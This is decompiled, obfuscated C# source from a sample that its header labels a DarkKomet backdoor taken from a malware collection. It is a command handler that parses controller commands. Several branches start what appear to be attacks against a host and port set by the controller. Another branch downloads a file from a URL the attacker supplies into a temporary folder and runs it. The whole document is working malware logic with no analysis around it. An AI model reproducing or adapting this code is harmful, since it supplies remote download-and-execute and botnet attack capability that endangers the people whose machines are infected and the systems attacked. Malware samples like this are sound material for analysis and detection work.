// Decompiled with JetBrains decompiler
// Type:  
// Assembly: AudioHD, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: C44212F0-6FD7-4886-BEB4-F43F84F3B277
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Backdoor.Win32.DarkKomet.hzfh-26a1c6d83f8e03a282b89acec8aef19eabb2f72745381a243a94811e2d7d3cb6.exe

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Net;

internal class \u0006\u2000
{
  private static \u0003\u2001 \u0002 = new \u0003\u2001();

  public void \u0002(string _param1)
  {
    string[] strArray = new string[0];
    WebClient webClient = new WebClient();
    try
    {
      strArray = _param1.Split('|');
    }
    catch
    {
    }
    string key;
    if ((key = strArray[0]) == null)
      return;
    if (\u0008\u2002.\u0002 == null)
      \u0008\u2002.\u0002 = new Dictionary<string, int>(10)
      {
        {
          \u0006\u2002.\u0002(-885878405),
          0
        },
        {
          \u0006\u2002.\u0002(-885878426),
          1
        },
        {
          \u0006\u2002.\u0002(-885878452),
          2
        },
        {
          \u0006\u2002.\u0002(-885878341),
          3
        },
        {
          \u0006\u2002.\u0002(-885878367),
          4
        },
        {
          \u0006\u2002.\u0002(-885878379),
          5
        },
        {
          \u0006\u2002.\u0002(-885878392),
          6
        },
        {
          \u0006\u2002.\u0002(-885878276),
          7
        },
        {
          \u0006\u2002.\u0002(-885878285),
          8
        },
        {
          \u0006\u2002.\u0002(-885878298),
          9
        }
      };
    int num;
    // ISSUE: explicit non-virtual call
    if (!__nonvirtual (\u0008\u2002.\u0002.TryGetValue(key, out num)))
      return;
    switch (num)
    {
      case 0:
        try
        {
          \u0003.\u0003();
          break;
        }
        catch (Exception ex)
        {
          \u0006\u2000.\u0002.\u0002(ex.ToString());
          break;
        }
      case 1:
        try
        {
          \u0008\u2000.\u0003();
          break;
        }
        catch (Exception ex)
        {
          \u0006\u2000.\u0002.\u0002(ex.ToString());
          break;
        }
      case 2:
        try
        {
          \u0003\u2002.\u0003();
          break;
        }
        catch (Exception ex)
        {
          \u0006\u2000.\u0002.\u0002(ex.ToString());
          break;
        }
      case 3:
        try
        {
          \u0008.\u0003();
          break;
        }
        catch (Exception ex)
        {
          \u0006\u2000.\u0002.\u0002(ex.ToString());
          break;
        }
      case 4:
        try
        {
          if (\u0003.\u0003\u2000)
            break;
          \u0003.\u0005 = Convert.ToString(strArray[1]);
          \u0003.\u0006 = ushort.Parse(strArray[2]);
          \u0003.\u0002\u2000 = Convert.ToInt32(strArray[3]);
          \u0003.\u000F = Convert.ToInt32(strArray[4]);
          \u0003.\u0002();
          break;
        }
        catch (Exception ex)
        {
          \u0006\u2000.\u0002.\u0002(ex.ToString());
          break;
        }
      case 5:
        try
        {
          if (\u0008\u2000.\u000F)
            break;
          \u0008\u2000.\u0005 = Convert.ToString(strArray[1]);
          \u0008\u2000.\u000E = Convert.ToInt32(strArray[2]);
          \u0008\u2000.\u0006 = Convert.ToInt32(strArray[2]);
          \u0008\u2000.\u0002();
          break;
        }
        catch (Exception ex)
        {
          \u0006\u2000.\u0002.\u0002(ex.ToString());
          break;
        }
      case 6:
        try
        {
          if (\u0003\u2002.\u0005\u2000)
            break;
          \u0003\u2002.\u0005 = Convert.ToString(strArray[1]);
          \u0003\u2002.\u0006 = ushort.Parse(strArray[2]);
          \u0003\u2002.\u0002\u2000 = Convert.ToInt32(strArray[3]);
          \u0003\u2002.\u0003\u2000 = Convert.ToInt32(strArray[4]);
          \u0003\u2002.\u000E = 500;
          \u0003\u2002.\u0002();
          break;
        }
        catch (Exception ex)
        {
          \u0006\u2000.\u0002.\u0002(ex.ToString());
          break;
        }
      case 7:
        try
        {
          if (\u0008.\u0003\u2000)
            break;
          \u0008.\u0005 = Convert.ToString(strArray[1]);
          \u0008.\u0002\u2000 = Convert.ToInt32(strArray[3]);
          \u0008.\u0008 = Convert.ToInt32(strArray[4]);
          \u0008.\u000E = 500;
          \u0008.\u0002();
          break;
        }
        catch (Exception ex)
        {
          \u0006\u2000.\u0002.\u0002(ex.ToString());
          break;
        }
      case 8:
        try
        {
          if (strArray[3] == \u0006\u2002.\u0002(-885878313))
          {
            string str = Convert.ToString(strArray[1]);
            if (!str.StartsWith(\u0006\u2002.\u0002(-885878523)))
              str = \u0006\u2002.\u0002(-885878523) + str;
            \u0005\u2001.\u0008.\u0002(str);
            break;
          }
          string str1 = \u0005\u2001.\u0003.\u0002(new Random().Next(5, 12)) + \u0006\u2002.\u0002(-885878322);
          string address = Convert.ToString(strArray[1]);
          if (!address.StartsWith(\u0006\u2002.\u0002(-885878523)))
            address = \u0006\u2002.\u0002(-885878523) + address;
          webClient.DownloadFile(address, Environment.GetEnvironmentVariable(\u0006\u2002.\u0002(-885878333)) + \u0006\u2002.\u0002(-885875661) + str1);
          Process process = new Process();
          process.StartInfo.FileName = Environment.GetEnvironmentVariable(\u0006\u2002.\u0002(-885878333)) + \u0006\u2002.\u0002(-885875661) + str1;
          if (strArray[2].ToString() != string.Empty)
            process.StartInfo.Arguments = strArray[2].ToString();
          process.Start();
          break;
        }
        catch (Exception ex)
        {
          \u0006\u2000.\u0002.\u0002(ex.ToString());
          break;
        }
    }
  }
}
